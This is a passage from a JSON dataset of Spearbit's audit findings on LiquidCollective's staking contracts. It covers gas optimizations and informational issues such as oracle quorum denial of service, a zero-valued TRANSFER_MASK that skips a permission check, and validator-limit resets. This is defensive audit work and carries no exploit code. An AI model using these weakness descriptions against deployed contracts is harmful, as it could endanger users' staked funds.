        "body": "In getOperatorDetails the 1st line is: _index = Operators.indexOf(_name); Since we already have the _index from this line we can use that along with getByIndex to retrieve the _opera- torAddress. This would reduce the gas cost significantly, since Operators.get(_name) calls Operators._getOp- eratorIndex(name) to find the _index again. testExecutorCanSetOperatorLimit() (gas: -1086 (-0.001%)) testGovernorCanSetOperatorLimit() (gas: -1086 (-0.001%)) testUserDepositsForAnotherUser() (gas: -2172 (-0.001%)) testDeniedUser() (gas: -2172 (-0.001%)) testELFeeRecipientPullFunds() (gas: -2172 (-0.001%)) testUserDepositsUnconventionalDeposits() (gas: -2172 (-0.001%)) testUserDeposits() (gas: -2172 (-0.001%)) testNoELFeeRecipient() (gas: -2172 (-0.001%)) testUserDepositsTenPercentFee() (gas: -2172 (-0.001%)) testUserDepositsFullAllowance() (gas: -2172 (-0.001%)) testValidatorsPenaltiesEqualToExecLayerFees() (gas: -2172 (-0.001%)) testValidatorsPenalties() (gas: -2172 (-0.001%)) testUserDepositsOperatorWithStoppedValiadtors() (gas: -3258 (-0.002%)) testMakingFunctionGovernorOnly() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorLimit() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorStatus() (gas: -1086 (-0.005%)) testRandomCallerCannotSetOperatorStoppedValidatorCount() (gas: -1086 (-0.005%)) testExecutorCanSetOperatorStoppedValidatorCount() (gas: -1086 (-0.006%)) testGovernorCanSetOperatorStatus() (gas: -1086 (-0.006%)) testGovernorCanSetOperatorStoppedValidatorCount() (gas: -1086 (-0.006%)) testGovernorCanAddOperator() (gas: -1086 (-0.006%)) testExecutorCanSetOperatorStatus() (gas: -1086 (-0.006%)) Overall gas change: -36924 (-0.062%) Also note, when the operator is not OperatorResolution.active, _index becomes -1 in both cases. With the change suggested if _index is -1, uint256(_index) == type(uint256).max which would cause getByIndex to revert with OperatorNotFoundAtIndex(index). But with the current code, it will revert with an index out-of-bound type of error. _operatorAddress = Operators.getByIndex(uint256(_index)).operator;",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Rewrite/simplify OracleV1.isMember to save gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "OracleV1.isMember can be simplified to save gas.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache beaconSpec.secondsPerSlot * beaconSpec.slotsPerEpoch multiplication in to save gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The calculation for _startTime and _endTime uses more multiplication than is necessary.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_rewardOperators could save gas by skipping operators with no active and funded validators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "_rewardOperators is the River function that distribute the earning rewards to each active operator based on the amount of active validators. The function iterate over the list of active operators returned by OperatorsRegistryV1.listActiveOperators calculating the total amount of active and funded validators (funded-stopped) and the number of active and funded validators (funded-stopped) for each operator. Because of current code, the final temporary array validatorCounts could have some item that contains 0 if the operator in the index position had no more active validators. This mean that: 1) gas has been wasted during the loop 2) gas will be wasted in the second loop, distributing 0 shares to an operator without active and funded valida- tors 3) _mintRawShares will be executed without minting any shares but emitting a Transfer event",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider adding a strict check to prevent Oracle admin to add more than 256 members",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "At the time of writing this issue in the latest commit at 030b52feb5af2dd2ad23da0d512c5b0e55eb8259, in the natspec docs of OracleMembers there is a @dev comment that says @dev There can only be up to 256 oracle members. This is due to how report statuses are stored in Reports Positions If we look at ReportsPositions.sol the natspec docs explains that Each bit in the stored uint256 value tells if the member at a given index has reported But both Oracle.addMember and OracleMembers.push do not prevent the admin to add more than 256 items to the list of oracle members. If we look at the result of the test (located in Appendix), we can see that:  It's possible to add more than 256 oracle members.  The result of oracle.getMemberReportStatus(oracleMember257) return true even if the oracle member has not reported yet.  Because of that, oracle.reportConsensusLayerData (executed by oracleMember257) reverts correctly.  If we remove a member from the list (for example oracle member with index 1) the oracleMember257 it will be able to vote because will be swapped with the removed member and at oracle.getMemberReportStatus(oracleMember257) return false. this point 45",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "ApprovalsPerOwner.set does not check if owner or spender is address(0).",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "When ApprovalsPerOwner value is set for an owner and a spender, the addresses of the owner and the spender are not checked against address(0).",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Quorum could be higher than the number of oracles, DOSing the Oracle contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Oracle.setQuorum only checks if the _newQuorum input parameter is not 0 or equal to the current quorum value. By setting a quorum higher than the number of oracle members, no quorum could be reached for the current or future slots.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "ConsensusLayerDepositManager.depositToConsensusLayer should be called only after a quorum has been reached to avoid rewarding validators that have not performed during the frame",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Alluvial is not tracking timestamps or additional information of some actions that happen on-chain like  when operator validator is funded on the beacon chain.  when an operator is added.  when validators are added or removed.  when a quorum is reached.  when rewards/penalties/slashes happen and which validator is involved.  and so on... 46 By not having these enriched informations it could happen that validators that have not contributed to a frame will still get rewards and this could be not fair to other validators that have contributed to the overall balance by working and bringing rewards. Let's make an example: we have 10 operators with 1k validators each at the start of a frame. At some point during the very end of the frame validato_10 get approved 9k validators and all of them get funded. Those validators only participated a small fraction in the production of the rewards. But because there's no way to track these timing and because oracles do not know anything about these (they just need to report the balance and the number of validators during the frame) they will report and arrive to a quorum of reportBeacon(correctEpoch, correctAmountOfBalance, 21_000) that will trigger the OracleManagerV1.setBeaconData. The contract check that 21_000 > DepositedValidatorCount.get() will pass and _onEarnings is called. Let's not consider the math involved in the process of calculating the number of shares to be distributed based on the staked balance delta, let's say that because of all the increase in capital Alluvial will call _rewardOperators(1_- 000_000); distributing 1_000_000 shares to operators based on the number of validators that produced that reward. Because as we said we do not know how much each validator has contributed, those shares will be contributed in the same way to operators that could have not contributed at all to the epoch. This is true for both scenarios where validators that have joined or exited the beacon chain not at the start of the epoch where the last quorum was set.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the decision to include executionLayerFees in the logic to trigger _onEarnings to dis- tribute rewards to Operators and Treasury",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The setBeaconData function from OracleManager contract is called when oracle members have reached a quorum. The function after checking that the report data respects some integrity check performs a check to distribute rewards to operators and treasury if needed: uint256 executionLayerFees = _pullELFees(); if (previousValidatorBalanceSum < _validatorBalanceSum + executionLayerFees) { _onEarnings((_validatorBalanceSum + executionLayerFees) - previousValidatorBalanceSum); } The delta between _validatorBalanceSum and previousValidatorBalanceSum is the sum of all the rewards, penalties and slashes that validators have accumulated during the validation work of one or multiple frames. By adding executionLayerFees to the check, it means that even if the validators have performed poorly (the sum of rewards is less than the sum of penalties+slash) they could still get rewards if executionLayerFees is greater than the negative delta of newSum-prevSum. If we look at the natspec of the _onEarnings it seems that only the validator's balance (without fees) should be used in the if check. 47 /// @notice Handler called if the delta between the last and new validator balance sum is positive /// @dev Must be overriden /// @param _profits The positive increase in the validator balance sum (staking rewards) function _onEarnings(uint256 _profits) internal virtual;",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider documenting how and if funds from the execution layer fee recipient are considered inside the annualAprUpperBound and relativeLowerBound boundaries.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "When oracle members reach a quorum, the _pushToRiver function is called. Alluvial is performing some sanity check to prevent malicious oracle member to report malicious beacon data. Inside the function, uint256 prevTotalEth = IRiverV1(payable(address(riverAddress))).totalUnderlyingSupply(); riverAddress.setBeaconData(_validatorCount, _balanceSum, bytes32(_epochId)); uint256 postTotalEth = IRiverV1(payable(address(riverAddress))).totalUnderlyingSupply(); uint256 timeElapsed = (_epochId - LastEpochId.get()) * _beaconSpec.slotsPerEpoch * _beaconSpec.secondsPerSlot; ,! _sanityChecks(postTotalEth, prevTotalEth, timeElapsed); function _sanityChecks(uint256 _postTotalEth, uint256 _prevTotalEth, uint256 _timeElapsed) internal ,! view { if (_postTotalEth >= _prevTotalEth) { uint256 annualAprUpperBound = BeaconReportBounds.get().annualAprUpperBound; if ( uint256(10000 * 365 days) * (_postTotalEth - _prevTotalEth) > annualAprUpperBound * _prevTotalEth * _timeElapsed ) { revert BeaconBalanceIncreaseOutOfBounds(_prevTotalEth, _postTotalEth, _timeElapsed, ,! annualAprUpperBound); } } else { uint256 relativeLowerBound = BeaconReportBounds.get().relativeLowerBound; if (uint256(10000) * (_prevTotalEth - _postTotalEth) > relativeLowerBound * _prevTotalEth) { revert BeaconBalanceDecreaseOutOfBounds(_prevTotalEth, _postTotalEth, _timeElapsed, relativeLowerBound); } ,! } } Both prevTotalEth and postTotalEth call SharesManager.totalUnderlyingSupply() that returns the value from Inside those balance is also included the amount of fees that are pulled from the River._assetBalance(). ELFeeRecipient (Execution Layer Fee Recipient). Alluvial should document how and if funds from the execution layer fee recipient are also considered inside the annualAprUpperBound and relativeLowerBound boundaries. 48",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Allowlist.allow allows arbitrary values for _statuses input",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of allow does not check if the value inside each _statuses item is a valid value or not. The function can be called by both the administrator or the allower (roles authorized to manage the user permissions) that can specify arbitrary values to be assigned to the corresponding _accounts item. The user's permissions handled by Allowlist are then used by the River contract in different parts of the code. Those permissions inside the River contracts are a limited set of permissions that could not match what the allower /admin of the Allowlist has used to update a user's permission when the allow function was called.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider exploring a way to update the withdrawal credentials and document all the possible scenarios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The withdrawal credentials is currently set when River.initRiverV1 is called. The func- tion will internally call ConsensusLayerDepositManager.initConsensusLayerDepositManagerV1 that will perform WithdrawalCredentials.set(_withdrawalCredentials); After initializing the withdrawal credentials, there's no way to update it and change it. The withdrawal cre- dentials is a key part of the whole protocol and everything that concern it should be well documented including all the worst-case scenario  What if the withdrawal credentials is lost?  What if the withdrawal credentials is compromised?  What if the withdrawal credentials must be changed (lost, compromised or simply the wrong one has been submitted)? What should be implemented inside the Alluvial logic to use the new withdrawal creden- tials for the operator's validators that have not been funded yet (the old withdrawal credentials has not been sent to the Deposit contract)? Note that currently there's seem to be no way to update the withdrawal credentials for a validator already submitted to the Deposit contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Oracle contract allows members to skip frames and report them (even if they are past) one by one or all at once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of reportBeacon allows oracle members to skip frames (255 epochs) and report them (even if they are past) one by one or all at once. Let's assume that members arrived to a quorum for epochId_X. When quorum is reached, _pushToRiver is called, and it will update the following properties:  clean all the storage used for member reporting.  set ExpectedEpochId to epochId_X + 255.  set LastEpochId to epochId_X. With this context, let's assume that members decide to wait 30 frames (30 days) or that for 30 days they cannot arrive at quorum. At the new time, the new epoch would be epochId_X + 255 * 30 The following scenarios can happen:  1) Report at once all the missed epochs Instead of reporting only the current epoch (epochId_X + 255 * 30), they will report all the previous \"skipped\" epochs that are in the past. In this scenario, ExpectedEpochId contains the number of the expected next epoch assigned 30 days ago from the previous call to _pushToRiver. In reportBeacon if the _epochId is what the system expect (equal to Expect- edEpochId) the report can go on. So to be able to report all the missing reports of the \"skipped\" frames the member just need to call in a se- quence reportBeacon(epochId_X + 255, ...), reportBeacon(epochId_X + 255 + 255, ...) + .... + report- Beacon(epochId_X + 255 * 30, ...)  2) Report only the last epoch In this scenario, they would call directly reportBeacon(epochId_X + 255 * 30, ...). _pushToRiver call _sani- tyChecks to perform some checks as do not allow changes in the amount of staked ether that are below or above some bounds. The call that would be made is _sanityChecks(oracleReportedStakedBalance, prevTotalEth, timeElapsed) where timeElapsed is calculated as uint256 timeElapsed = (_epochId - LastEpochId.get()) * _beacon- Spec.slotsPerEpoch * _beaconSpec.secondsPerSlot; So, time elapsed is the number of seconds between the reported epoch and the LastEpochId. But in this scenario, LastEpochId has the old value from the previous call to _pushToRiver made 30 days ago that will be epochId_X. Because of this, the check made inside _sanityChecks for the upper bound would be more relaxed, allowing a wider spread between oracleReportedStakedBalance and prevTotalEth",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming OperatorResolution.active to a more meaningful name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The name active in the struct OperatorResolution could be misleading because it can be confused with the fact that an operator (the struct containing the real operator information is Operator ) is active or not. The value of OperatorResolution.active does not represent if an operator is active, but is used to know if the index associated to the struct's item (OperatorResolution.index) is used or not.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "lsETH and WlsETH's name() functions return inconsistent name.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "lsETH.name() is River Ether, while WlsETH.name() is Wrapped Alluvial Ether.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename modifiers to have consistent naming and patterns only<ROLE>.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The modifiers ifGovernor and ifGovernorOrExecutor in Firewall.sol have a different naming conventions and also logical patterns.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "OperatorResolution.active might be a redundant struct field which can be removed.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The value of active stays true once it has been set true for a given index. This is especially true since the only call to Operators.set is from OperatorsRegistryV1.addOperator which does not override values for already registered names.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "The expression for selectedOperatorAvailableKeys in OperatorsRegistry can be simplified.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "tors[selectedOperatorIndex].keys. Since the places that the limit has been set with a value other than 0 has checks against going above keys bound: operators[selectedOperatorIndex].limit is always less than or equal OperatorsRegistry.1.sol#L250-L252 if (_newLimits[idx] > operator.keys) { revert OperatorLimitTooHigh(_newLimits[idx], operator.keys); } OperatorsRegistry.1.sol#L324-L326 if (keyIndex >= operator.keys) { revert InvalidIndexOutOfBounds(); } OperatorsRegistry.1.sol#L344-L346 52 if (_indexes[_indexes.length - 1] < operator.limit) { operator.limit = _indexes[_indexes.length - 1]; }",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "The unused constant DELTA_BASE can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The constant DELTA_BASE in BeaconReportBounds is never used.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused modifiers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The modifier active(uint256 _index) is not used in the project.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Modifier names do not follow the same naming patterns",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The modifier names do not follow the same naming patterns in OperatorsRegistry.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "In AllowlistV1.allow the input variable _statuses can be renamed to better represent that values it holds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In AllowlistV1.allow the input variable _statuses can be renamed to better represent the values it holds. _statuses is a bitmap where each bit represents a particular action that a user can take.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "riverAddress can be renamed to river and we can avoid extra interface casting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "riverAddress's name suggest that it is only an address. Although it is an address with the IRiverV1 attached to it. Also, we can avoid unnecessary casting of interfaces.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define named constants for numeric literals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In _sanitychecks there 2 numeric literals 10000 and 365 days used: uint256(10000 * 365 days) * (_postTotalEth - _prevTotalEth) ... if (uint256(10000) * (_prevTotalEth - _postTotalEth) > relativeLowerBound * _prevTotalEth) {",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move memberIndex and ReportsPositions checks at the beginning of the OracleV1.reportBeacon function.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The checks for memberIndex == -1 and ReportsPositions.get(uint256(memberIndex)) happen in the middle of reportBeacon after quite a few calculations are done.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what incentivizes the operators to run their validators when globalFee is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If GlobalFee could be 0, then neither the treasury nor the operators earn rewards. What factor would motivate the operators to keep their validators running?",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document how Alluvial plans to prevent institutional investors and operators get into business directly and bypass using the River protocol.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Since the list of operators and also depositors can be looked up from the information on-chain, what would prevent Institutional investors (users) and the operators to do business outside of River? Is there going to be an off-chain legal contract between Alluvial and these other entities to prevent this scenario?",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document how operator rewards will be distributed if OperatorRewardsShare is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If OperatorRewardsShare could be 0, then the operators won't earn rewards. What factor would motivate the operators to keep their validators running? Sidenote: Other incentives for the operators to keep their validators running (if their reward share portion is 0) would be some sort of MEV or block proposal/attestation bribes. Related: Avoid to waste gas distributing rewards when the number of shares to be distributed is zero",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Current operator reward distribution does not favor more performant operators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Reward shares are distributed based on the fraction of the active funded non-stopped validators owned by an operator. This distribution of shares does not promote the honest operation of validators to the fullest extent. Since the oracle members don't report the delta in the balance of each validator, it is not possible to reward operators/validators that have been performing better than the rest. Also if a high-performing operator or operators were the main source of the beacon balance sum and if they had enough ETH to initially deposit into the ETH2.0 deposit contract on their own, they could have made more profit that way versus joining as an operator in the River protocol.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "TRANSFER_MASK == 0 which causes a no-op.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "TRANSFER_MASK is a named constant defined as 0 (River.1.sol#L37). Like the other masks DEPOSIT_- MASK and DENY_MASK which supposed to represent a bitmask, on the first look, you would think TRANSFER_MASK would need to also represent a bitmask. But if you take a look at _onTransfer: function _onTransfer(address _from, address _to) internal view override { IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_from, TRANSFER_MASK); // this call reverts if unauthorized or denied IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_to, TRANSFER_MASK); // this call reverts if unauthorized or denied ,! ,! } This would translate into calling onlyAllowed with the: IAllowlistV1(AllowlistAddress.get()).onlyAllowed(x, 0); Now if we look at the onlyAllowed function with these parameters: function onlyAllowed(x, 0) external view { uint256 userPermissions = Allowlist.get(x); if (userPermissions & DENY_MASK == DENY_MASK) { revert Denied(_account); } if (userPermissions & 0 != 0) { // <--- ( x & 0 != 0 ) == false revert Unauthorized(_account); } } Thus if the _from, _to addresses don't have their DENY_MASK set to 1 they would not trigger a revert since we would never step into the 2nd if block above when TRANSFER_MASK is passed to these functions. The TRANSFER_MASK is also used in _onDeposit: IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_depositor, DEPOSIT_MASK + TRANSFER_MASK); // DEPOSIT_MASK + TRANSFER_MASK == DEPOSIT_MASK ,! IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_recipient, TRANSFER_MASK); // like above in ,! `_onTransfer`",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reformat numeric literals with many digits for better readability.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Reformat numeric literals with many digits into a more readable form.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Firewall should follow the two-step approach present in River when transferring govern address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Both River and OperatorsRegistry follow a two-step approach to transfer the ownership of the contract. 1) Propose a new owner storing the address in a pendingAdmin variable 2) The pending admins accept the new role by actively calling acceptOwnership This approach makes this crucial action much safer because 1) Prevent the admin to transfer ownership to address(0) given that address(0) cannot call acceptOwnership 2) Prevent the admin to transfer ownership to an address that cannot \"admin\" the contract if they cannot call acceptOwnership. For example, a contract do not have the implementation to at least call acceptOwnership. 3) Allow the current admin to stop the process by calling transferOwnership(address(0)) if the pending admin has not called acceptOwnership yet The current implementation does not follow this safe approach, allowing the governor to directly transfer the gov- ernor role to a new address.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "OperatorRegistry.removeValidators is resetting the limit (approved validators) even when not needed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of removeValidators allow an admin or node operator to remove val- idators, passing to the function the list of validator's index to be removed. Note that the list of indexes must be ordered DESC. At the end of the function, we can see these checks if (_indexes[_indexes.length - 1] < operator.limit) { operator.limit = _indexes[_indexes.length - 1]; } That reset the operator's limit to the lower index value (this to prevent that a not approved key get swapped to a position inside the limit). The issue with this implementation is that it is not considering the case where all the operator's validators are already approved by Alluvial. In this case, if an operator removes the validator with the lower index, all the other validators get de-approved because the limit will be set to the lower limit. Consider this scenario: 59 op.limit = 10 op.keys = 10 op.funded = 0 This mean that all the validators added by the operator have been approved by Alluvial and are safe (keys == limit). If the operator or Alluvial call removeValidators([validatorIndex], [0]) removing the validator at index 0 this will  swap the validator_10 with validator_0.  set the limit to 0 because 0 < 10 (_indexes[_indexes.length - 1] < operator.limit). The consequence is that even if all the validators present before calling removeValidators were \"safe\" (because approved by Alluvial) the limit is now 0 meaning that all the validators are not \"safe\" anymore and cannot be selected by pickNextValidators.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming transferOwnership to better reflect the function's logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of transferOwnership is not really transferring the ownership from the current admin to the new one. The function is setting the value of the Pending Admin that must subsequently call acceptOwnership to accept the role and confirm the transfer of the ownership.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Wrong return name used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The min function returns the minimum of the 2 inputs, but the return name used is max.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Discrepancy between architecture and code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The architecture diagram states that admin triggers deposits on the Consensus Layer Deposit Man- ager, but the depositToConsensusLayer() function allows anyone to trigger such deposits.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider replacing the remaining require with custom errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In the vast majority of the project contracts have defined and already use Custom Errors that provide a better UX, DX and gas saving compared to require statements. There are still some instances of require usage in ConsensusLayerDepositManager and BytesLib contracts that could be replaced with custom errors.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Both wlsETH and lsETH transferFrom implementation allow the owner of the token to use trans- ferFrom like if it was a \"normal\" transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of transferFrom allow the msg.sender to use the function like if it was a \"normal\" transfer. In this case, the allowance is checked only if the msg.sender is not equal to _from if (_from != msg.sender) { uint256 currentAllowance = ApprovalsPerOwner.get(_from, msg.sender); if (currentAllowance < _value) { revert AllowanceTooLow(_from, msg.sender, currentAllowance, _value); } ApprovalsPerOwner.set(_from, msg.sender, currentAllowance - _value); } This implementation diverge from what is usually implemented in both Solmate and OpenZeppelin.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Both wlsETH and lsETH tokens are reducing the allowance when the allowed amount is type(uint256).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the function transferFrom in both SharesManager.1.sol and WLSETH.1.sol is not taking into consideration the scenario where a user has approved a spender the maximum possible allowance type(uint256).max. The Alluvial transferFrom acts differently from standard ERC20 implementations like the one from Solmate and OpenZeppelin. In their implementation, they check and reduce the spender allowance if and only if the allowance is different from type(uint256).max.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing, confusing or wrong natspec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In the current implementation not all the constructors, functions, events, custom errors, variables or struct are covered by natspec comments. Some of them are only partially covered (missing @param, @return and so on). Note that the contracts listed in the context section of the issue have inside of them complete or partial missing natspec.  Natspec Fixes / Typos: River.1.sol#L38-L39 Swap the empty line with the NatSpec @notice - /// @notice Prevents unauthorized calls - + + /// @notice Prevents unauthorized calls OperatorsRegistry.1.sol#L44, OperatorsRegistry.1.sol#L61, OperatorsRegistry.1.sol#L114 Replace name with index. - /// @param _index The name identifying the operator + /// @param _index The index identifying the operator OperatorsRegistry.1.sol#L218 Replace cound with count. - /// @notice Changes the operator stopped validator cound + /// @notice Changes the operator stopped validator count  Expand the natspec explanation: We also suggest expanding some function's logic inside the natspec OperatorsRegistry.1.sol#L355-L358 Expand the natspec documentation and add a @return natspec comment clarifying that the returned value is the number of total operator and not the active/fundable one. ReportsVariants.sol#L5 Add a comment that explains the COUNT_OUTMASK's assignment. This will mask beaconValidators and beacon- Balance in the designed packing. xx...xx <beaconBalance> <beaconValidators> xxxx & COUNT_OUTMASK == 00...00 <beaconBalance> <beaconValidators> 0000 ReportsVariants.sol ReportsVariants should have a documentation regarding the packing used for ReportsVariants in an uint256: [ 0, 16) : <voteCount> oracle member's total vote count for the numbers below (uint16, 2 bytes) ,! [16, [48, 112) : <beaconBalance> 48) : <beaconValidators> total number of beacon validators (uint32, 4 bytes) total balance of all the beacon validators (uint64, 6 bytes) OracleMembers.sol Leave a comment/warning that only 